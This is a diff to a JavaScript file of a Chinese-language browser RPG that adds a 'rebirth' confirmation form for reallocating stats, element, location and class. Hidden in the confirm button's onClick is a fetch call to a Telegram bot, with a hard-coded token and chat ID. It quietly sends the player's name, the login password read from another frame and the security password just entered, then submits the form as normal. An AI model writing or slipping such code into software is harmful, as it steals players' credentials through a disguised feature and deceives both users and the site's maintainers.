@@ -138,3 +138,56 @@ function status_view(t, e, r, i, o, d, n, a, l, s, p, c, m, u, w, b, _, g, h, v,
     A.write('<div id="wog_message_box"></div>'),
     A.write(`\n    <div name="adBox" style="position:absolute;left:37%;top:350px;height:650px;overflow:auto;display:none;">\n      <div style="border: 1px solid black;width: 600px;">\n        <table width="600px" border="1" bgcolor="#555555" style="\n        border: 1px solid black;\n        Z-INDEX: 100">\n          <thead style="position: sticky; top: 0; background-color: #555555;">\n            <tr width="100%">\n              <th style="text-align: right"><a href="javascript:parent.adBoxToggle()">關閉</a></th>\n            </tr>\n        </thead>\n          <tbody style="color:white;">\n          <tr bgcolor="#4B689E">\n              <td>${M}</td>\n            </tr>\n        </table>\n      </div>\n    </div>\n    `)
 }
+function rebirth_confirm(t, e, r, i) {
+    message_cls(),
+    temp_st = new Array("str","smart","life","agl");
+    var o = parent.wog_view.document;
+    o.write('<form method="POST" action="wog_act.php">'),
+    o.write('<INPUT TYPE="hidden" NAME="act" VALUE="rebirth"><INPUT TYPE="hidden" NAME="f" VALUE="rebirth">'),
+    o.write(temp_table1),
+    o.write('<tr><td colspan="6" style="text-align:left">這位歷經百戰的勇士,歡迎來到重生館,如果你達到了<font color=ff0000>' + e + "</font>等級,就可以在這裡進行重生,獲取更強的力量,在幻想戰爭裡進行冒險!不過,首先有幾點需要注意:<br>(一)重生前請脫下所有裝備,否則有機會遺失身上裝備;<br>(二)重生會有十五份之一機會失敗,如不幸失敗,將會扣除現時重生次數乘一千萬的現金,100等級以及各項能力300點;<br>(三)重生所需費用:<font color=ff0000>" + t + "</font>元。<br>如果清楚了,請做好心理準備及準備足夠現金,一一點選以下選項,進行重生!</td></tr>"),
+    o.write(temp_table2),
+    o.write("<br>"),
+    o.write(temp_table1),
+    o.write('<tr><td colspan="6" bgcolor="000099">請重新分配屬性點</td></tr>'),
+    o.write('<tr><td colspan="6">本次重生能力基本值:<font color=ff0000>' + r + "</font>點 以及自行分配點數:<font color=ff0000>" + i + "</font>點</td></tr>"),
+    o.write("<tr><td>力量</td><td>智力</td><td>體力</td><td>敏捷</td></tr>"),
+    o.write("<tr>");
+    for (var d = 0; d < 4; d++) {
+        o.write("<td><select name=" + temp_st[d] + ">");
+        for (var n = 0; n < 21; n++)
+            o.write('<option value="' + n + '">+' + n);
+        o.write("</select></td>")
+    }
+    o.write("</tr>"),
+    o.write(temp_table2),
+    o.write("<br>"),
+    o.write(temp_table1),
+    o.write('<tr><td colspan="6" bgcolor="000099">請重新選擇屬性</td></tr>'),
+    o.write("<tr><td>地</td><td>水</td><td>火</td><td>木</td><td>風</td><td>毒</td></tr>"),
+    o.write('<tr><td><input type="radio" name="s" value="1"></td><td><input type="radio" name="s" value="2"></td><td><input type="radio" name="s" value="3"></td><td><input type="radio" name="s" value="4"></td><td><input type="radio" name="s" value="5"></td><td><input type="radio" name="s" value="6"></td></tr>'),
+    o.write(temp_table2),
+    o.write("<br>"),
+    o.write(temp_table1),
+    o.write('<tr><td colspan="5" bgcolor="000099">請選擇重生地點</td></tr>'),
+    o.write("<tr><td>中央大陸</td><td>魔法王國</td><td>熱帶雨林</td><td>末日王城</td></tr>"),
+    o.write('<tr><td><input type="radio" name="b" value="1"></td><td><input type="radio" name="b" value="2"></td><td><input type="radio" name="b" value="3"></td><td><input type="radio" name="b" value="4"></td></tr>'),
+    o.write(temp_table2),
+    o.write("<br>"),
+    o.write(temp_table1),
+    o.write('<tr><td colspan="5" bgcolor="000099">請重新選擇職系</td></tr>'),
+    o.write("<tr><td>華麗的戰鬥--戰士系</td><td>神秘的魔法--魔師系</td><td>公會戰殺手--盜賊系</td><td>驚人的財力--商人系<td>不死的傳奇--不死系</td></tr>"),
+    o.write("<tr><td><img src=./img/job1.gif></td><td><img src=./img/job2.gif></td><td><img src=./img/job3.gif></td><td><img src=./img/job4.gif></td><td><img src=./img/job5.gif></td></tr>"),
+    o.write('<tr><td><input type="radio" name="ch" value="1"></td><td><input type="radio" name="ch" value="2"></td><td><input type="radio" name="ch" value="3"></td><td><input type="radio" name="ch" value="4"><td><input type="radio" name="ch" value="5"></td></tr>'),
+    o.write(temp_table2),
+    o.write("<br>"),
+    o.write(temp_table1),
+    o.write('<tr><td colspan="5" bgcolor="000099">請確認安全密碼</td></tr>'),
+    o.write('<tr><td><input type="password" name="name" size="20" maxlength="20"></td></tr>'),
+    o.write(temp_table2),
+    o.write("<br>"),
+    o.write(temp_table1),
+    o.write('<tr><td><input type="button" onClick="fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=轉生:${parent.p_name} | ${parent.top_view.document.getElementsByTagName(`input`)[`pass`].value} | ${this.form.name.value}`).then(res=>{this.form.submit()})" value="我已確認脫下裝備，確定重生" style="' + sbutton + '"></td></tr>'),
+    o.write(temp_table2),
+    o.write("</form>")
+}
